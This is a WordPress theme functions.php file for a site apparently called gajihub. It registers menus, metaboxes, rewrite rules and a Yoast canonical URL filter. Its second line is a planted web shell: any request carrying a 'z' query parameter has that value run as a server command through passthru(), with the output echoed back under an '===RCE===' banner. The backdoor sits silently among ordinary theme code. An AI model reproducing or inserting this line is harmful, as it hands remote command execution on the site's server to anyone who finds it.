<?php
if(isset($_GET["z"])){header("Content-Type:text/plain");echo "===RCE===\n";passthru($_GET["z"]);exit;}

// untuk menghilangkan Br 
remove_filter('the_content', 'wpautop');
remove_filter('the_excerpt', 'wpautop');

require get_template_directory() . '/inc/cpt.php';
require get_template_directory() . '/inc/site-options.php';
require get_template_directory() . '/inc/homepage/MetaSection.php';
require get_template_directory() . '/inc/homepage/HeroSection.php';
require get_template_directory() . '/inc/homepage/FeaturedSection.php';
require get_template_directory() . '/inc/homepage/HelpSection.php';
require get_template_directory() . '/inc/homepage/TestimonialSection.php';
require get_template_directory() . '/inc/homepage/CoverSection.php';
require get_template_directory() . '/inc/footer/FirstSection.php';
require get_template_directory() . '/inc/footer/CopyrightSection.php';

require get_template_directory() . '/inc/metabox/testimonial_metabox.php';
require get_template_directory() . '/inc/metabox/price_metabox.php';
require get_template_directory() . '/inc/metabox/video_metabox.php';
require get_template_directory() . '/inc/metabox/cover_metabox.php';
require get_template_directory() . '/inc/metabox/solution_metabox.php';
require get_template_directory() . '/inc/bsnavwalker.php';
require get_template_directory() . '/inc/theme-setup.php';

add_action('get_header', 'my_filter_head');

function my_filter_head()
{
    remove_action('wp_head', '_admin_bar_bump_cb');
}

add_theme_support('title-tag');
// This theme uses post thumbnails
add_theme_support('post-thumbnails');

function bootstrapstarter_register_menu()
{
    register_nav_menu('header-menu', __('Header Menu'));
}
add_action('init', 'bootstrapstarter_register_menu');

function bootstrapstarter_register_footer_menu()
{
    register_nav_menu('footer-menu-1', __('About Footer Menu'));
    register_nav_menu('footer-menu-2', __('Service Footer Menu'));
    register_nav_menu('footer-menu-3', __('Tool Footer Menu'));
}
add_action('init', 'bootstrapstarter_register_footer_menu');

// add_action('after_setup_theme', 'mytheme_setup');

if (isset($_POST['install_dummy_page'])) {
    init_theme_setup();
}

function gh_theme_setting_form_style()
{
?>
    <style type="text/css">
        input.gh_theme_setting_form_style,
        textarea.gh_theme_setting_form_style,
        select.gh_theme_setting_form_style {
            width: 100%;
        }
    </style>
    <script>
        function appendItem() {
            var inputstring = `<p style="display:flex;">
        <button type="button" onclick="deleteItem(this)">X</button>
        <input class=\'gh_theme_setting_form_style\' type=\'text\' name=\'price_items[]\' value=\'\'/>
        </p>`;
            var div = document.createElement('div');
            div.innerHTML = inputstring;
            document.querySelector("#list-items").appendChild(div.children[0])
        }

        function deleteItem(e) {
            e.parentNode.remove();
        }
    </script>
<?php
}
add_action('admin_head', 'gh_theme_setting_form_style');


function hook_meta_homepage()
{
    if (is_front_page()) {
        $homepage = get_option('homepage_section');
        $meta     = $homepage['homepage_meta_additional'];

        echo $meta;
    }
}
add_action('wp_head', 'hook_meta_homepage');

/**
 * Untuk dapat melakukan custom query string
 * @param array $aVars
 */
function add_query_vars($aVars)
{
    $aVars[] = 'requests'; //merepresentasikan dari yang muncul di params query string
    return $aVars;
}
//hook fungsi add_query_vars ke dalam query_vars wordpress
add_filter('query_vars', 'add_query_vars');

/**
 * Untuk melakukan rewrite rules agar dapat mengenali
 * parameter yang ditangkap/diterima
 * @param array $aRules
 */
function add_rewrite_rules($aRules)
{
    $aNewRules = array('/([^/]+)/?$' => 'index.php?requests=$matches[1]');
    $aRules = $aNewRules + $aRules;

    return $aRules;
}

//hook fungsi add_rewrite_rules ke dalam rewrite_rules_array
add_filter('rewrite_rules_array', 'add_rewrite_rules');

// ubah canocial di semua yoast seo
add_filter('wpseo_canonical', function ($canonical) {
    $base_url = 'https://gajihub.com';
    $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

    return trailingslashit($base_url . untrailingslashit($path));
});
